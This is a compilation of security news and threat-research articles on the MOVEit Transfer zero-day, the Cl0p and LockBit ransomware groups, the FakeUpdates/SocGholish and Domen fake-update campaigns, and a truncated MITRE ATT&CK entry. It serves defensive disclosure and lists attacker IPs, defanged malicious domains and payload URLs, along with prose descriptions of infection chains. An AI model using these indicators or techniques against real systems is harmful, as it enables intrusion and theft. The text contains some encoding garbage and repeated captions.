with Microsoft Azure integration should take immediate action to rotate their Azure storage keys. In our previous post about this vulnerability I mentioned a few tools to help you find the malicious artifacts: Malwarebytes detects the malicious webshell C:\MOVEitTransfer\wwwroot\human2.aspx as Exploit.Silock.MOVEit and blocks five malicious IP addresses—138.197.152.201, 209.97.137.33, 5.252.191.0/24, 148.113.152.144, 89.39.105.108—that were found to be looking for vulnerable systems.

 On May 31, 2023, Progress Software released a security bulletin about a critical vulnerability in MOVEit Transfer. The security bulletin states: This means the vulnerability could lead to an attacker gaining escalated privileges and unauthorized access to the environment. MOVEit Transfer is a widely used file transfer software which encrypts files and uses secure File Transfer Protocols to transfer data. As such it has a large userbase in the healthcare industry and many others. Progress advertises MOVEit as the leading secure Managed File Transfer (MFT) software used by thousands of organizations around the world to provide complete visibility and control over file transfer activities. To give you an idea of the possible impact, a Shodan search query for exposed MOVEit Transfer instances yielded over 2,500 results, most of which belong to US customers.  Several researchers have observed that this vulnerability is being exploited in the wild. BleepingComputer says it has information that cybercriminals have been exploiting the zero-day in the MOVEit MFT software to perform massive data downloads from organizations. The method used to compromise systems is to drop a webshell in the wwwroot folder of the MOVEit install directory. This allows the attacker to obtain a list of all folders, files, and users within MOVEit, download any file within MOVEit, and insert an administrative backdoor user into, giving attackers an active session to allow credential bypass The Cybersecurity and Infrastructure Agency (CISA) is urging users and organizations to review the MOVEit Transfer Advisory, follow the mitigation steps, apply the necessary updates, and hunt for any malicious activity. Several researchers have provided methods to make the hunt easy. These are the ones I could find: Note: A Sigma rule is a generic and open YAML-based signature format that enables a security operations team to describe relevant log events in a flexible and standardized format. YARA rules are a way of identifying malware (or other files) by creating rules that look for certain characteristics. All MOVEit Transfer versions are affected by this vulnerability. See the table below for the security patch for each supported version. The method recommended by Progress is to: Disable all HTTP and HTTPs traffic to your MOVEit Transfer environment. More specifically, modify firewall rules to deny HTTP and HTTPs traffic to MOVEit Transfer on ports 80 and 443 until the patch can be applied. It is important to note, that until HTTP and HTTPS traffic is enabled again: Patches for all supported MOVEit Transfer versions are linked below. Please note, the license file can remain the same to apply the patch. Affected Version Fixed Version Documentation MOVEit Transfer 2023.0.0 MOVEit Transfer 2023.0.1 MOVEit 2023 Upgrade Documentation MOVEit Transfer 2022.1.x MOVEit Transfer 2022.1.5 MOVEit 2022 Upgrade Documentation MOVEit Transfer 2022.0.x MOVEit Transfer 2022.0.4 MOVEit Transfer 2021.1.x MOVEit Transfer 2021.1.4 MOVEit 2021 Upgrade Documentation MOVEit Transfer 2021.0.x MOVEit Transfer 2021.0.6 Enable all HTTP and HTTPs traffic to your MOVEit Transfer environment. Then confirm the files have been successfully deleted and no unauthorized accounts remain by following follow the steps under ""Review, Delete and Reset"" again. If you do find indicators of compromise, you should reset the service account credentials again. Monitor network, endpoints, and logs for IoCs (Indicators of Compromise). Malwarebytes blocks traffic to five malicious IP addresses—138.197.152.201, 209.97.137.33, 5.252.191.0/24, 148.113.152.144, 89.39.105.108—that were found to look for vulnerable systems, and detects the malicious C:\MOVEitTransfer\wwwroot\human2.aspx as Exploit.Silock.MOVEit.

 In chess, the threefold repetition rule states that a player may claim a draw if the same position occurs three times during the game. Whether this means that customers of the popular file transfer utility MOVEit Transfer can ask for their money back remains to be seen, but we do hope it signals the end of the game. Let’s do a small recap first, because it’s easy to lose track here. The Common Vulnerabilities and Exposures (CVE) database lists publicly disclosed computer security flaws. We will use these CVE numbers where available. Timeline: This latest vulnerability could lead to escalated privileges and potential unauthorized access to the environment. Please note that it is very important to follow the instructions outlined in the latest advisory regarding the order in which the patches need to be applied and based on how many patches have already been applied. The best advice provided by Progress is probably to disable all HTTP and HTTPs traffic to MOVEit Transfer on ports 80 and 443 to safeguard the environments while a patch is being prepared to address the vulnerabilities and in case even more of them come to the surface. Meanwhile the Cybersecurity and Infrastructure Security Agency (CISA)  says it’s providing support to several federal agencies that have experienced intrusions affecting their MOVEit applications. Among the probably hundreds of victims are Payroll provider Zellis who serves British Airways and the BBC, oil giant Shell, several financial services organizations, insurance companies, and many others. Reportedly, two US Department of Energy (DOE) entities were also compromised. Victims have been identified in the UK, US, Germany, Austria, Switzerland, Luxembourg, France, and the Netherlands. Organizations in the US make for most of the victims, but no ransom demands have been made of federal agencies according to a CISA spokesperson. Cl0p re-emphasized that it was not going to use data stolen from government organizations with a message on its dark web site: We shouldn’t mistake this for altruism. It could be they are simply afraid of the consequences and because they are fully aware that governmental organizations are not allowed to pay the ransom anyway, so there is no profit to be made there. Our own Cybersecurity Evangelist, Mark Stockley, has his doubts about Cl0p's methods: ""Cl0p's approach supposes that the US government would react more strongly to sensitive data being leaked than it would to multiple simultaneous breaches by the same criminal organisation. This ignores the fact that by using zero-days to attack hundreds of targets simultaneously, including parts of the federal government, Cl0p has already made itself ransomware's squeakiest wheel.""

 The US Department of State’s national security rewards program, Rewards for Justice (RFJ), is offering a reward of up to $10 million for information linking the Cl0p ransomware gang, or any other malicious cyber actors targeting US critical infrastructure, to a foreign government. Advisory from @CISAgov, @FBI: https://t.co/jenKUZRZwtDo you have info linking CL0P Ransomware Gang or any other malicious cyber actors targeting U.S. critical infrastructure to a foreign government?Send us a tip. You could be eligible for a reward.#StopRansomware pic.twitter.com/fAAeBXgcWA 

This is not really new. RFJ’s statutory authorities offers rewards for information in four broad categories and one of them is: Malicious Cyber Activity For information that identifies or locates any individual who, while actingâ¯at the direction or under the control of a foreign government, aids or abets a violation of the Computer Fraud and Abuse Act  (“CFAA”), 18 U.S.C. § 1030. This includes foreign election interference. But the Tweet explicitly mentioning Cl0p is new. The gang is thought to be behind a recent ransomware spree that compromised a large number of organizations by exploiting a zero-day flaw in Progress’ MOVEit Transfer software. With as many as 2,500 targets exposed on the Internet, the number of potential victims could be in the hundreds. Some of them have already confirmed, either by the firms themselves or by  being mentioned on the Cl0p leak site. Campaigns like Cl0p's abuse of the MOVEit vulnerability, or high profile attacks like the one on Colonial Pipeline in 2021, can trigger an extra focus on the specific ransomware group responsible. Perhaps aware of this, Cl0p took to its website to preemptively promise that it was not going to use data stolen from government organizations and would delete it instead. It seems that was not enough to avoid getting in the cross-hairs of the US federal government, as we predicted just hours before. The tweet appeared shortly after our own Cybersecurity Evangelist, Mark Stockley, expressed his doubts that Cl0p's plan would help them avoid unwanted attention from law enforcement. ""Cl0p's approach supposes that the US government would react more strongly to sensitive data being leaked than it would to multiple simultaneous breaches by the same criminal organisation. This ignores the fact that by using zero-days to attack hundreds of targets simultaneously, including parts of the federal government, Cl0p has already made itself ransomware's squeakiest wheel."" And don’t think that all these ransomware operators sit safely out of reach, behind what used to be an iron curtain. The recent arrest of Ruslan Magomedovich Astamirov, a ransomware actor associated with LockBit, in Arizona, shows that the cybercriminals think they can hide anywhere if they are careful enough. US Attorney Philip R. Sellinger for the District of New Jersey said: Also, some criminals can’t help themselves and need to show off how rich they are or how clever they think they are. The best example may be Mark Sokolovsky. This Ukrainian national and alleged cybercriminal loved posting selfies with fistfuls of cash. When the Russian invasion of Ukraine caused him to flee the country, his girlfriend posted pictures of the couple’s journey on her Instagram account. Sokolovsky was arrested in the Netherlands and is awaiting extradition to the US, accused of being a key player in the cybercrime operation behind Raccoon Stealer. So, if you're in the market for a $10 million reward, happy hunting. And for anyone eligible, I’m throwing in a free copy of Malwarebytes Premium. You’ll need it.

 The US Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing and Analysis Center (MS-ISAC), and the cybersecurity authorities of Australia, Canada, United Kingdom, Germany, France, and New Zealand (CERT NZ, NCSC-NZ) have all published a joint Cybersecurity Advisory about LockBit. To help organizations understand and defend against this global threat and its large number of unconnected LockBit affiliates, the advisory titled Understanding Ransomware Threat Actors: LockBit includes: The advisory points out that in 2022, LockBit was the most active global ransomware group and RaaS provider in terms of the number of victims claimed on its data leak site. This confirms Malwarebytes findings that LockBit is the most active Ransomware-as-a-Service operator. In our monthly Ransomware Reviews, LockBit often ranks top for victim count, although Cl0p is a close rival. Cl0p has switched to a different modus operandi, where the gang acquires a vulnerability in popular business tools, develops an exploitation method, and then uses it on every vulnerable instance it can find. Because of this, the attacks come in waves, while LockBit is more constant. One of the advantages of being a RaaS operator is the diversity of attack vectors that the initial access brokers (IABs) bring to the table. Some specialize in malspam, while other use known vulnerabilities against organizations that are behind on patches, or try to brute force Internet-facing systems like VPNs, RDP, or SSH. So when one affiliate has a bad month, another is likely to compensate. This variety has another downside for the defenders. The advisory states: “Due to the large number of unconnected affiliates in the operation, LockBit ransomware attacks vary significantly in observed tactics, techniques, and procedures (TTPs). This variance in observed ransomware TTPs presents a notable challenge for organizations working to maintain network security and protect against a ransomware threat.” A disadvantage for operators of an RaaS model is the mutual trust that is needed. When you’re among anonymous criminals that must prove to be an exceptional challenge, which is very likely the reason why many other RaaS operators like DarkSide and Avaddon shut down. The geographical distribution of the IABs is also grounds for some remarkable differences. Some of the participating countries provided their own statistics for LockBit’s share in ransomware attacks, with Australia noting that in the last year the gang made up 18% of total reported ransomware incidents. In Canada (22%) and New Zealand (23%), LockBit was responsible for over one in every five attacks in 2022. France said 11% of the attacks it has seen since 2020 involved LockBit. In the US, however, the main target of almost every commercial ransomware group, LockBit is responsible for 16% of attacks on public entities, which include municipal and county governments, public higher education and K-12 schools, as well as vital services like law enforcement agencies. The advisory also provides long lists of the legitimate tools, vulnerabilities, tactics, and techniques deployed by the LockBit affiliates. As we said, due to the number (over 100) and diversity of the affiliates these lists are long and subject to change.  Malwarebytes EDR and MDR removes all remnants of ransomware and prevents you from getting reinfected.

             NEWARK, N.J. â The Justice Department today announced charges against a Russian national for his involvement in deploying numerous LockBit ransomware and other cyberattacks against victim computer systems in the United States, Asia, Europe, and Africa. Ruslan Magomedovich Astamirov, 20, (ÐÐ¡Ð¢ÐÐÐÐ ÐÐ, Ð ÑÑÐ»Ð°Ð½ ÐÐ°Ð³Ð¾Ð¼ÐµÐ´Ð¾Ð²Ð¸ÑÑ), of Chechen Republic, Russia, is charged by complaint unsealed today in Newark federal court with conspiring to commit wire fraud and conspiring to intentionally damage protected computers and to transmit ransom demands. Astamirov was arrested on the complaint in Arizona and is scheduled to make his initial appearance in the District of Arizona. âAstamirov is the third defendant charged by this office in the LockBit global ransomware campaign, and the second defendant to be apprehended,â U.S. Attorney Sellinger said. âThe LockBit conspirators and any other ransomware perpetrators cannot hide behind imagined online anonymity. We will continue to work tirelessly with all our law enforcement partners to identify ransomware perpetrators and bring them to justice.â âThis Lockbit-related arrest, the second in six months, underscores the Justice Departmentâs unwavering commitment to hold ransomware actors accountable,â Deputy Attorney General Lisa O. Monaco said. âIn securing the arrest of a second Russian national affiliated with the LockBit ransomware, the department has once again demonstrated the long arm of the law.Â  We will continue to use every tool at our disposal to disrupt cybercrime, and while cybercriminals may continue to run, they ultimately cannot hide.â âThese cyber criminals hide in a virtual world but cause very real harm when they seize control of computer systems, putting companies and customers in an unimaginable bind,â FBI Newark Special Agent in Charge James E. Dennehy said. âEither pay the ransoms or lose control of your entire information technology infrastructure. It is too high a price for anyone to be forced to pay. Astamirov's arrest, along with the others charged in this case, is a simple but devastating illustration of how we are following through on our promise - we are bringing these hackers to justice."" According to documents filed in this case: The LockBit ransomware variant first appeared around January 2020. LockBit actors have executed over 1,400 attacks against victims in the United States and around the world, issuing over $100 million in ransom demands and receiving at least as much as tens of millions of dollars in actual ransom payments made in the form of bitcoin. In furtherance of his LockBit-related activities, Astamirov owned, controlled, and used a variety of email addresses, Internet Protocol (IP) addresses, and other online provider accounts that allowed him and his co-conspirators to deploy LockBit ransomware and to communicate with their victims. Additionally, in at least one circumstance, law enforcement was able to trace a portion of a victimâs ransom payment to a virtual currency address in Astamirovâs control. This announcement follows LockBit-related charges in two other cases from the District of New Jersey. In November 2022, the department announced criminal charges against Mikhail Vasiliev, and Canadian national, who is currently in custody in Canada awaiting extradition to the United States. In May 2023, the department announced the indictment of Mikhail Pavlovich Matveev, aka Wazawaka, aka m1x, aka Boriselcin, aka Uhodiransomwar, for his alleged participation in separate conspiracies to deploy LockBit, Babuk, and Hive ransomware variants against victims in the United States and abroad. The charge of conspiring to intentionally damage protected computers and to transmit ransom demands is punishable by a maximum of five years in prison. The charge of conspiring to commit wire fraud is punishable by a maximum of 20 years in prison. Both charges are also punishable by a maximum fine of either $250,000 or twice the gain or loss from the offense, whichever is greatest. The FBI Newark Field Officeâs Cyber Crimes Task Force is investigating the case. The FBI Phoenix Division, the Jersey City Police Department, New Jersey State Police, Newark IRS Criminal Investigation, and the international partners from Europolâs European Cybercrime Centre, Eurojust, National Police Agency of Japan, Franceâs Gendarmerie Nationale Cyberspace Command (Cyber Crime Investigation Unit / C3N), National Crime Agency and South West Regional Organized Crime Unit of the United Kingdom, Kantonspolizei ZÃ¼rich of Switzerland, Landeskriminalamt Schleswig-Holstein and the Bundeskriminalamt of Germany, and Swedish Police Authority of Sweden also provided valuable assistance. The government is represented by Assistant U.S. Attorneys Andrew M. Trombly, Vinay S. Limbachia, and David E. Malagold of the Cybercrime Unit in Newark and DOJ Trial Attorneys Jessica C. Peck and Jorge Gonzalez of the Computer Crime and Intellectual Property Section. The charge and allegations contained in the complaint are merely accusations, and the defendant is presumed innocent unless and until proven guilty.

                                                        by JÃ©rÃ´me Segura
 A malware campaign which seems to have started at least since December 2017 has been gaining steam by enrolling a growing number of legitimate but compromised websites. Its modus operandi relies on social engineering users with fake but convincing update notifications. Similar techniques were used by a group leveraging malvertising on high traffic websites such as Yahoo to distribute ad fraud malware. The patterns are also somewhat reminiscent of EITest's HoeflerText campaign where hacked websites are scrambled and offer a font for download. More recently, there has been a campaign affecting Magento websitesÂ that also pushes fake updates (for the Flash Player) which delivers the AZORult stealer by abusing GitHub for hosting. Today, we are looking at what we call the 'FakeUpdates campaign' and describing its intricate filtering and evasion techniques.Â One of the earliest examples we could find was reported by BroadAnalysis on December 20, 2017. The update file is not an executable but rather a script which is downloaded from DropBox, a legitimate file hosting service, as can be seen in the animation below. 
Figure 1: A typical redirection to the 'FakeUpdates' scheme from a hacked site
This campaign affects multiple Content Management Systems (CMS) in somewhat similar ways. Several of the websites we checked were outdated and therefore vulnerable to malicious code injection. It is possible that attackers used the same techniques to build their inventory of compromised sites but we do not have enough information to confirm this theory.
WordPress andÂ Joomla
Both WordPress and Joomla sites that were hacked bear the same kind of injection within their CMS' JavaScript files. Figure 1: A typical redirection to the 'FakeUpdates' scheme from a hacked site 
Figure 2: A Compromised WordPress site pushing a fake Google Chrome update

Figure 3:Â A Compromised Joomla site pushing a fake Mozilla Firefox update
Some commonly injected files include the jquery.js and caption.js libraries where code is typically appended and can be spotted by doing a comparison with a clean copy of the same file. Figure 2: A Compromised WordPress site pushing a fake Google Chrome update Figure 3:Â A Compromised Joomla site pushing a fake Mozilla Firefox update 
Figure 4: Diffing a clean and suspicious copy of the same library
The additional blurb of code is responsible for the next chain of events that loads the fraudulent layer onto the website you are visiting. The image below shows a beautified version of the code injected in the CMS platforms, whose goal is to call the redirection URL: Figure 4: Diffing a clean and suspicious copy of the same library 
Figure 5: Injected code responsible for the redirection
We wrote a simple crawler to browse a list of sites and then parsed the results. We were able to identify several hundred compromised WordPress and Joomla websites even after a small iteration through the list. Although we don't have an exact number of sites that are affected, we surmise that it is in the thousands. Figure 5: Injected code responsible for the redirection 
Figure 6: A partial list of compromised sites Figure 6: A partial list of compromised sites Squarespace
Squarespace is another popular Content Management System that is also affected by the same campaign. This was pointed out by @Ring0x0Â and we found a forum post dated February 28, where a Squarespace user is asking for help, saying ""it basically redirected me to a full page ""your version of chrome needs updating"""". 
Figure 7: A Squarespace user reporting that their sites was tampered with
So I login to the admin panel and in the GIT HISTORY it shows that one of my users which has never even logged in before, has sent an upload: site-bundle.js last week, along with some other big list of files {sic}.
We dug deeper into these compromises and identified a slightly different redirection mechanism than the one used on WordPress or Joomla sites. With Squarespace, a blurb of JavaScript is injected directly into the site's homepage instead. Figure 7: A Squarespace user reporting that their sites was tampered with So I login to the admin panel and in the GIT HISTORY it shows that one of my users which has never even logged in before, has sent an upload: site-bundle.js last week, along with some other big list of files {sic}. 
Figure 8: Traffic showing a malicious redirection taking place on a Squarespace site
It pulls a source file from query[.]network that in turn retrieves bundle.js from boobahbaby[.]com: Figure 8: Traffic showing a malicious redirection taking place on a Squarespace site 
Figure 9: The injected code present in hacked Squarespace sitesÂ 
bundle.js contains the same script we described earlier that is used to call the redirection URL: Figure 9: The injected code present in hacked Squarespace sitesÂ  
Figure 10: The same redirection code used in WP and Joomla infections is used here
According to this PublicWWW query, a little over 900 SquareSpace sites have been injected with this malicious redirection code. Figure 10: The same redirection code used in WP and Joomla infections is used here 
Figure 11: Identifying other hacked Squarespace sites using a string pattern Figure 11: Identifying other hacked Squarespace sites using a string pattern Redirection URL and filtering
All CMSes trigger redirection URIs with similar patterns that eventually load the fraudulent update theme. Based on our tests, the URIs have identifiers that apply to a particular CMS; for example cid=221 is associated with WordPress sites, while cid=208 with Joomla.

There are other interesting artifacts on this infrastructure, such as an ad rotator:
track.positiverefreshment.net:81/adrotator/banner.js?cid=100
But if we focus on the redirection code itself, we notice that potential victims are fingerprinted and the ultimate redirection to the FakeUpdates template is conditional, in particular with only one hit per single IP address. The last JavaScript is responsible for creating the iframe URL to that next sequence.

There are templates for the Chrome, Firefox and Internet Explorer browsers, the latter getting a bogus Flash Player update instead. [gallery type=""slideshow"" ids=""23033,23034,23032""]
Figure 13: Attackers are targeting browsers with professional looking templates
The decoy pages are hosted on compromised hosts via sub-domains using URIs with very short life spans. Some of those domains have a live (and legitimate website) whereas others are simply parked: Figure 13: Attackers are targeting browsers with professional looking templates Legitimate (shadowed) domain:

Figure 15: Parked domains can hide ulteriorÂ motives Figure 14: This property's credentials have most likely been stolen and used to register a malicious subdomain Figure 15: Parked domains can hide ulteriorÂ motives Final infection chain and payloads
The infection starts with the fake update disguised as a JavaScript file retrieved fromÂ the Dropbox file hosting service. The link to Dropbox, which isÂ updated at regular intervals, is obfuscated inside of the the first web session belonging to the fake theme.

Figure 16: the fileURL variable contains the Dropbox URL
This JavaScript is heavily obfuscated to make static analysis very difficult and also to hide some crucial fingerprinting that is designed to evade virtual machines and sandboxes. Figure 16: the fileURL variable contains the Dropbox URL 
Figure 17: The malicious JavaScript downloaded from DropBox
According to this very good and detailed analysis of the JS file, this is because step2 of the victim's profiling uses WScript.Network and WMI to collect system information (BIOS, manufacturer, architecture, MAC address, processes, etc) and eventually makes the decision to continue with the payload or end the script without delivering it. Figure 17: The malicious JavaScript downloaded from DropBox A failed infection will only contain 2 callbacks to the C2 server: 
Figure 18: A host that is not a genuine machine was detected and infection aborted
While a successful infection will contain 3 callbacks to the C2 server (including the payload): Figure 18: A host that is not a genuine machine was detected and infection aborted 
Figure 19: When all checks pass, the user is served the payload
The encoded payload stream is decoded by wscript.exe and a malicious binary (Chrome_71.1.43.exe in this case), dropped in the %temp% folder. That file was digitally signed and also employed various evasion techniques (such as an immediate reboot) to defeat sandboxes. Figure 19: When all checks pass, the user is served the payload 
Figure 20: A digitallyÂ signed file is no guarantee for safety
Upon examination, we determined that this is the Chtonic banking malware, a variant of ZeusVM. Once the system has restarted, Chtonic retrieves a hefty configuration file fromÂ 94.100.18[.]6/3.bin. Figure 20: A digitallyÂ signed file is no guarantee for safety In a second replay attempt, we got the NetSupport Remote Access Tool, a commercial RAT instead. Its installation and configuration were already well covered in this blog. Once again, we noticed the heavy use of obfuscation throughout the delivery of this program that can be used for malicious purposes (file transfer, remote Desktop, etc.). 
Figure 21: Traffic from the RAT infection, showing its backend server Figure 21: Traffic from the RAT infection, showing its backend server Conclusion
This campaign relies on a delivery mechanism that leverages social engineering and abuses a legitimate file hosting service. The 'bait' file consists of a script rather than a malicious executable, giving the attackers the flexibility to develop interesting obfuscation and fingerprinting techniques. Compromised websites were abused to not only redirect users but also to host the fake updates scheme, making their owners unwitting participants in a malware campaign. This is why it is so important to keep Content Management Systems up to date, as well as use good security hygiene when it comes to authentication. Malwarebytes blocks the domains and servers used in this attack, as well as the final payload.

SocGholish is a malware variant which continues to thrive in the current information security landscape. By utilizing an extensive variety of stages, eligibility checks, and obfuscation routines, it remains one of the most elusive malware families to date. SocGholish was observed in the wild as early as 2018. The absence of details surrounding target selection, evasion logic, and specific procedures employed by TA569 and their use of SocGholish in the intermediary phases of infection contributes to this shroud of mystery. SocGholish is primarily known for its âdrive-byâ download style of initial infection. Such attacks employ malicious JavaScript, which is injected into compromised, but otherwise legitimate, websites. If an unsuspecting victim receives an email containing a link to a compromised website and clicks on it, the injected JavaScript will execute upon the browser loading the page. If the victimâs browser meets the eligibility requirements for infection (using a Windows host, originating from an external source, and specific cookie checks), the user will be presented with the download for a file masquerading as a browser update. By loading this update prompt from the intended domain, it bolsters the purported authenticity of the update. This second stage prompts the user to download and execute. Additional eligibility checks are performed prior to serving a compressed archive containing a JavaScript file. An example of the filename would be âAutoUpdater.js.â Once the targeted user executes the malicious payload, the third stage of the SocGholish attack chain begins. A series of Windows Management Instrumentation (WMI) calls are invoked by the parent process executing the JavaScript payload (wscript was observed in this current generation though cscript or other native Windows script hosts could be leveraged). These WMI calls serve to profile the system to ascertain further eligibility for additional follow-on payloads. Data such as domain trusts, username, and computer name are exfiltrated to the attacker-controlled infrastructure. This reconnaissance phase is yet another opportunity for the TAs to avoid deploying their ultimate payload in an analysis environment.  Figure 1: SocGholish Overview  Figure 2: Fake Update Served While the tactics of most phishing campaigns are similar across the spectrum of malware, SocGholish deviates from norms by taking a pass on all traditional hallmarks of phishing campaigns. Instead, Threat Research has observed SocGholish being leveraged in email campaigns with injections on sites that meet one of two criteria: It is worth noting though that the vast majority of SocGholish injects are not visible in email campaigns. At the date of publication, Threat Research is tracking over 1000 active implants while only observing a small fraction of those within our own data. According to a two-week sample of SocGholish infection traffic, Proofpoint identified nearly 300 infected websites targeting users in multiple countries, including Poland, Italy, France, Iran, Spain, Germany, the United Kingdom, and the United States, among others. This begs the question, âAre there multiple types of campaigns with distinct tactics and targeting?â The current generation of SocGholish implants requires a redirect from a specifically formatted source so simply typing in the URL and visiting the page is not enough to trigger the initial JavaScript. This, coupled with other observations, merits Threat Research to assess with moderate confidence that TAs are, in some aspect, relying on the aggregation of injected links by services like Google Alerts and other aggregate feeds and are not directly distributing the URLs via email. Rather, infected URLs are sent legitimately by a user, aggregate service, or marketing service without knowledge that the web page is injected with SocGholish.  Figure 3: SocGholish delivered via Google Alert Proofpoint assesses with high confidence TA569 is a financially motivated threat actor who almost certainly monetizes access gained through the exclusive use and sale of SocGholish infections. Through our investigation and collaboration with partners, Proofpoint has identified that malware deployed after SocGholish will vary based upon the profile of the infected victimâs machine. If the target is domain joined, ransomware, including but not limited to WastedLocker, Hive, and LockBit, is commonly deployed according to a variety of incident response journals. If the victim is not domain joined, a remote access trojan (RAT) will be deployed. Proofpoint assesses with moderate confidence that the deployment of a RAT is an attempt to harvest credentials to secure a foothold on a network suitable for ransomware deployment, such as the targetâs employer. Regardless of the victimâs profile, TA569 is extremely aggressive in deploying follow-on malware leading to a remarkably low dwell time. The follow-on ransomware activity referenced in this report overlaps with activity publicly reported as EvilCorp, Gold Drake, and UNC2165. As TA569 focuses on initial access into target environments, Proofpoint does not suggest equivalence in attribution between TA569 and actors conducting post-infection activity.  Figure 4: SocGholish as part of a kill chain Users should be aware of novel social engineering and exploitation mechanisms used by TA569 to deliver malicious payloads, even from trusted sources. This attack chain underscores the importance of consistent, clear communication from organizations concerning user awareness training and software update best practices. SocGholish remains a serious threat to enterprises due to it being delivered through legitimate means and the speed at which the attack progresses from initial access to ransomware. Defenders must be diligent in evaluating alerts and must not be quick to dismiss them as false positives.

 Some of the most common web threats we track have a social engineering component. Perhaps the more popular ones are those encountered via malvertising, or hacked websites that push fraudulent updates. We recently identified a website compromise with a scheme we had not seen before; it's part of a campaign using a social engineering toolkit that has drawn over 100,000 visits in the past few weeks. The toolkit, which we dub Domen, is built around a detailed client-side script that acts as a framework for different fake update templates, customized for both desktop and mobile users in up to 30 languages. Loaded as an iframe from compromised websites (most of them running WordPress) and displayed over top as an additional layer, it entices victims to install so-called updates that instead download the NetSupport remote administration tool. In this blog we describe its tactics, techniques, and procedures (TTPs) that remind us of some past and current social engineering campaigns. The premise looks typical of many other social engineering toolkit templates we've come across before. Here, users are tricked into downloading and running a Flash Player update: Note that the domain wheelslist[.]net belongs to a legitimate website that has been hacked and where an iframe from chrom-update[.]online is placed as a layer above the normal page: Clicking the UPDATE or LATER button downloads a file called 'download.hta', indexed on Atlassian's Bitbucket platform and hosted on an Amazon server (bbuseruploads.s3.amazonaws.com): Upon execution, that HTA script will run PowerShell and connect to xyxyxyxyxy[.]xyz in order to retrieve a malware payload. That payload is a package that contains the NetSupport RAT: In late 2018, we documented a malicious redirection campaign that we dubbed FakeUpdates, also known as SocGholish based on a ruleset from EmergingThreats. It leverages compromised websites and performs some of the most creative fingerprinting checks we've seen, before delivering its payload (NetSupport RAT). We recently noticed a tweet that reported SocGholish via the compromised site fistfuloftalent[.]com, although the linked sandbox report shows the same template we described earlier, which is different than the SocGholish one:  The reason why the sandbox is flagging SocGholish is because the compromised site contains artifacts related to it, and does, in some circumstances, actually redirect to it: This hacked site actually hosts two different campaigns and based on some browser and network fingerprinting, you might be served one or the other. This can be confirmed by looking at the injected code in two different pieces of JavaScript, the first one being flagged by the EmergingThreats ruleset. Although the templates for SocGholish and the new campaign are different, they both: Side note: A publicly saved VirusTotal graph (saved screenshot here) shows that the threat actors also used DropBox at some point to host the netSupport RAT. They double compressed the file, first as zip and then as rar. Similarities with SocGholish could be simply due to the threat actor getting inspired by what has been done before. However, the fact that both templates deliver the same RAT is something noteworthy. At about the same time as we were reviewing this new redirection chain, we saw this other one identified by @tkanalyst tagged as FontPack that is reminiscent of the HoeflerText social engineering toolkit reported by Proofpoint in early 2017. Going back to the traffic capture we collected before, we immediately notice the same infrastructure that includes a JavaScript template (template.js) and a panel (.xyz domain): A closer look at the template.js file confirms they are practically identical except for a different payload URL and some unique identifiers: The template.js file is a beautiful piece of work that goes beyond fake fonts or Flash Player themes. While we initially detected this redirection snippet under the FontPack label, we decided to call this social engineering framework Domen, based on a string found within the code. The single JavaScript file controls a variety of templates depending on the browser, operating system, and locale. For instance, the same fake error message is translated into 30 different languages. One particular variable called ""banner"" sets the type of social engineering theme: var banner = '2'; // 1 - Browser Update | 2 - Font | 3 - Flash We already documented the Flash Player one, while the Font (HoeflexText copycat) and some of its variations (Chrome, Firefox) was also observed. Here's the third one, which is a browser update:  There is also a template for mobile devices (which again is translated into 30 languages) that instructs users how to download and run a (presumably malicious) APK: The scope of this campaign remains unclear but it has been fairly active in the past few weeks. Every time a user visits a compromised site that has been injected with the Domen toolkit, communication takes place with a remote server hosted at asasasqwqq[.]xyz: The page will create a GET request that returns a number: If we trust those numbers (a subsequent visit increments it by 1), it means this particular campaign has received over 100,000 views in the past few weeks. Over time, we have seen a number of different social engineering schemes. For the most part, they are served dynamically based on a user's geolocation and browser/operating system type. This is common, for example, with tech support scam pages (browlocks) where the server will return the appropriate template for each victim. What makes the Domen toolkit unique is that it offers the same fingerprinting (browser, language) and choice of templates thanks to a client-side (template.js) script which can be tweaked by each threat actor. Additionally, the breadth of possible customizations is quite impressive since it covers a range of browsers, desktop, and mobile in about 30 different languages. Malwarebytes users were already protected against this campaign thanks to our anti-exploit protection that thwarts the .hta attack before it can even retrieve its payload. Note: We shared a traffic capture with the folks at EmergingThreats who created a new set of rules for it.

Malwarebytes Threat Intelligence - July 2023 2,https://attack.mitre.org/techniques/T1059,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell. There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic. Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.[1][2][3] APT19 downloaded and launched code within a SCT file.[4] APT32 has used COM scriptlets to download Cobalt Strike beacons.[5]  APT37 has used Ruby scripts to execute payloads.[6] APT39 has utilized AutoIt and custom scripts to perform internal reconnaissance.[7][8] Bandook can support commands to execute Java-based payloads.[9]  Bonadan can create bind and reverse shells on the infected system.[10]  CHOPSTICK is capable of performing remote command execution.[11][12] DarkComet can execute various types of scripts on the victimâs machine.[13] Donut can generate shellcode outputs that execute via Ruby.[14]  Dragonfly has used the command line for execution.[15] Empire uses a command-line interface to interact with systems.[16] FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[17] FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[18][19] FIN7 used SQL scripts to help perform tasks on the victim's machine.[20][21][20] FIVEHANDS can receive a command line argument to limit file encryption to specified directories.[22][23] Fox Kitten has used a Perl reverse shell to communicate with C2.[24] Get2 has the ability to run executables with command-line arguments.[25] gh0st RAT is able to open a remote shell to execute commands.[26][27] Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.[28] Malware used by Ke3chang can run commands on the command-line interface.[29][30] Kessel can create a reverse shell between the infected host and a specified system.[10]  Matryoshka is capable of providing Meterpreter shell access.[31] Melcoz has been distributed through an AutoIt loader script.[32] OilRig has used various types of scripting for execution.[33][34][35][36][37] For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[38] P.A.S. Webshell has the ability to create reverse shells with Perl scripts.[39] PoetRAT has executed a Lua script through a Lua 